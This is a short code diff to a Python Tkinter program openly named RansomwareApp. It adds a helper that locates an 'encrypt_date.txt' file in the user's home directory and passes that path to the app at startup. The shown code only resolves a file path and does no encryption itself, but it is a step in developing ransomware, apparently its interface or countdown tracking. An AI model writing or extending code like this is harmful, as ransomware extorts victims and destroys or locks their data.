@@ -72,6 +72,20 @@ class RansomwareApp(tk.Tk):
     def show_error_message(self, message):
         tk.messagebox.showerror("Error", message)
 
+    @staticmethod
+    def get_file_path():
+        # Get the current user's home directory
+        username = os.environ.get('USERNAME')
+        if not username:
+            print("Error: Unable to retrieve the current username.")
+            return None
+
+        # Construct the full path to the file
+        file_name = "encrypt_date.txt"
+        file_path = os.path.join(os.path.expanduser('~' + username), file_name)
+
+        return file_path
+
 if __name__ == "__main__":
-    app = RansomwareApp(sys.argv[1])
+    app = RansomwareApp(RansomwareApp.get_file_path())
     app.mainloop()
